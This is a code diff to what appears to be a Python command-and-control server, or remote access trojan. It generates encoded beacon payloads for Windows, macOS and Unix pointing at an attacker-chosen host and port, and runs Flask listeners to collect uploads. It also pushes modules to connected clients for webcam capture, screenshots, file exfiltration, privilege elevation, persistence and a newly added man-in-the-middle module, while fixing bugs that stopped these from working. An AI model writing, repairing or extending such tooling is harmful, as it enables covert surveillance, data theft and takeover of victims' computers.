@@ -6,11 +6,10 @@ import time
 import pyfiglet
 import base64
 import subprocess
-from flask import Flask
-import random
-from flask import Flask, request
 import random
 import csv
+from flask import Flask, request
+
 try:
     with open("Mods/screenshot/screenshot_win.txt", "r") as f:
         screenshot_mod_win_plain= f.read()
@@ -40,6 +39,9 @@ try:
     with open("Mods/elevate/windows_elevate.txt", "r") as f:
         elevate_mod_win_plain = f.read()
         elevate_mod_win = base64.b64encode(elevate_mod_win_plain.encode()).decode()
+    with open("Mpds/MTM/mitm.txt", "r") as f:
+        mitm_mod_win_plain = f.read()
+        mitm_mod_win = base64.b64encode(mitm_mod_win_plain.encode()).decode()
 
     with open("Mods/send/send_win.txt", "r") as f:
         send_mod_win_plain = f.read()
@@ -131,7 +133,7 @@ try:
             break
     print("Port to listen on:")
     postport = int(input())
-except:
+except Exception as e:
     print("Error fetching... Are you in the main folder?")
 print("Enter a filename to save this session's connected clients:")
 csv_file = input("")
@@ -146,13 +148,13 @@ with open(csv_file, 'w', newline='') as file:
 
 print("Select Beacon Type")
 print("powershell shellcode  → Type 'win'")
-print("macOS binary          → Type 'mac")
-print("Raw bash (unix)       → Type 'unix")
+print("macOS binary          → Type 'mac'")
+print("Raw bash (unix)       → Type 'unix'")
 print ("NOTE: to compile macOS binaries, you MUST be on a macOS based system")
 
-type = input()
+beacon_type = input()
 
-if 'win' in type:
+if 'win' in beacon_type:
     print("Generating")
     time.sleep(1)
     generateHost = get_win_payload.replace("127.0.0.1", posthost)
@@ -160,7 +162,7 @@ if 'win' in type:
     win_encode = base64.b64encode(generatePort.encode('utf-16le')).decode()
     print("\033[94m" + win_encode + "\033[0m")
 
-if 'mac' in type:
+if 'mac' in beacon_type:
     time.sleep(1)
     try:
         generateHost_mac = get_mac_payload.replace("127.0.0.1", posthost)
@@ -172,7 +174,7 @@ if 'mac' in type:
     except:
         print("Error. Could not generate payload. Is VS code installed?")
 
-if 'unix' in type:
+if 'unix' in beacon_type:
     print("Generating")
     time.sleep(1)
     generateHost_bash = get_unix_payload.replace("127.0.0.1", posthost)
@@ -194,12 +196,13 @@ def submit():
     print("Saved to uploads folder")
 
     return '', 200
-try:
-    # === Run Flask Server ===
-    def run_flask():
-        logging.getLogger('werkzeug').setLevel(logging.ERROR)
-        app.run(host="0.0.0.0", port=80)
 
+# === Run Flask Server ===
+def run_flask():
+    logging.getLogger('werkzeug').setLevel(logging.ERROR)
+    app.run(host="0.0.0.0", port=80)
+
+try:
     threading.Thread(target=run_flask, daemon=True).start()
 except:
     print("Error could not start flask server")
@@ -286,20 +289,21 @@ def handle_post():
     except:
         print("Error fetching data") 
         return 'Error', 500
-try:
-    def run_post_server():
-        logging.getLogger('werkzeug').setLevel(logging.ERROR)
-        app.run(host=posthost, port=postport)
-except:
-    print("Error could not start server")
+
+def run_post_server():
+    logging.getLogger('werkzeug').setLevel(logging.ERROR)
+    app.run(host=posthost, port=postport)
     
 
 # === Main Command Loop ===
 def main(platform_type=None):
     global platformList
     logging.basicConfig(level=logging.INFO)
-    server_thread = threading.Thread(target=run_post_server, daemon=True)
-    server_thread.start()
+    try:
+        server_thread = threading.Thread(target=run_post_server, daemon=True)
+        server_thread.start()
+    except:
+        print("Error could not start server")
 
     client_id = input("Waiting for clients ID. Enter client ID when a new connection appears")
 
@@ -314,9 +318,9 @@ def main(platform_type=None):
         print("\033[94mcommand sent\033[0m")
         platform = next((item['platform_type'] for item in platformList if item.get('id') == client_id) , None)
         if 'webcam' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 ps_code = webcam_mod_win.replace("127.0.0.1", posthost)
-                ps_code = webcam_mod_win.replace("4444", str(postport))
+                ps_code = ps_code.replace("4444", str(postport))
                 shared["text"] = ps_code
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -325,7 +329,7 @@ def main(platform_type=None):
                 print("Taking webcam pic...")
             else:
                 bash_code = webcam_mod_unix.replace("127.0.0.1", posthost)
-                bash_code = webcam_mod_unix.replace("4444", str(postport))
+                bash_code = bash_code.replace("4444", str(postport))
                 shared["text"] = bash_code
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -334,7 +338,7 @@ def main(platform_type=None):
                 print("Taking webcam pic...")
 
         elif 'installdep' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 shared["text"] = mod_win
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -350,9 +354,9 @@ def main(platform_type=None):
                 print("Installing dependencies...")
 
         elif 'screenshot' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 ps_code = screenshot_mod_win.replace("127.0.0.1", posthost)
-                ps_code = screenshot_mod_win.replace("4444", postport)
+                ps_code = ps_code.replace("4444", str(postport))
                 shared["text"] = ps_code
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -361,7 +365,7 @@ def main(platform_type=None):
                 print("Taking screenshot...")
             else:
                 bash_code = screenshot_mod_unix.replace("127.0.0.1", posthost)
-                bash_code = screenshot_mod_unix.replace("4444", str(postport))
+                bash_code = bash_code.replace("4444", str(postport))
                 shared["text"] = bash_code
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -371,15 +375,15 @@ def main(platform_type=None):
 
         elif 'send' in var:
 
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 filename = input("Input file name to send: ")
                 sendHost = send_mod_win_plain.replace("127.0.0.1", posthost)
                 sendPort = sendHost.replace("4444", str(postport))
                 ps_code_send = sendPort.replace("foofile", filename)
                 print(ps_code_send)
                 ps_code = ps_code_send + " 906778"
-                send_mod_win = base64.b64encode(ps_code.encode()).decode()
-                shared["text"] = send_mod_win
+                send_mod_win_encoded = base64.b64encode(ps_code.encode()).decode()
+                shared["text"] = send_mod_win_encoded
                 shared["num"] = client_id
                 time.sleep(0.5)
                 shared["text"] = "$FALSE"
@@ -392,15 +396,15 @@ def main(platform_type=None):
                 ps_code_send = sendPort.replace("foofile", filename)
                 print(ps_code_send)
                 ps_code = ps_code_send + " 906778"
-                send_mod_unix = base64.b64encode(ps_code.encode()).decode()
-                shared["text"] = send_mod_unix
+                send_mod_unix_encoded = base64.b64encode(ps_code.encode()).decode()
+                shared["text"] = send_mod_unix_encoded
                 shared["num"] = client_id
                 time.sleep(0.5)
                 shared["text"] = "$FALSE"
                 shared["num"] = ""
                 print("Sending file...")
         elif 'elevate' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 shared["text"] = elevate_mod_win
                 shared["num"] = client_id
                 time.sleep(0.5)
@@ -409,13 +413,27 @@ def main(platform_type=None):
                 print("Elevation prompt sent...")
             else:
                 print("Error: module unavailable on this platform.")
+        elif 'MITM' in var:
+            oiHost = mitm_mod_win.replace("fooip", posthost)
+            oiPort = oiHost.replace("fooport", str(postport))
+            replace_oi_encode = base64.b64encode(oiPort.encode()).decode()
+            shared["text"] = replace_oi_encode
+            shared["num"] = client_id
+            time.sleep(0.5)
+            shared["text"] = "$FALSE"
+            shared["num"] = ""
+
         elif 'persistence' in var:
-            if 'Windows' in platform:
-                shared["text"] = elevatevar_mod
-                shared["num"] = client_id
-                time.sleep(0.5)
-                shared["text"] = "$FALSE"
-                shared["num"] = ""
+            if platform and 'Windows' in platform:
+                # Note: elevatevar_mod is referenced but not defined in original scope
+                try:
+                    shared["text"] = elevatevar_mod
+                    shared["num"] = client_id
+                    time.sleep(0.5)
+                    shared["text"] = "$FALSE"
+                    shared["num"] = ""
+                except NameError:
+                    print("Error: elevatevar_mod module not loaded.")
             else:
                 print("mod not support on selected platform yet.")
 
@@ -423,7 +441,7 @@ def main(platform_type=None):
             client_id = input("Enter new client ID: ")
         
         elif 'find' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 oiHost = oi_mod_win_plain.replace("127.0.0.1", posthost)
                 oiPort = oiHost.replace("4444", str(postport))
                 replace_oi_encode = base64.b64encode(oiPort.encode()).decode()
@@ -436,7 +454,7 @@ def main(platform_type=None):
                 print("mod not support on selected platform yet.")
 
         elif 'clients' in var:
-            if 'Windows' in platform:
+            if platform and 'Windows' in platform:
                 clients = "clients"
                 encoded_clients = base64.b64encode(clients.encode()).decode()
                 shared["text"] = encoded_clients
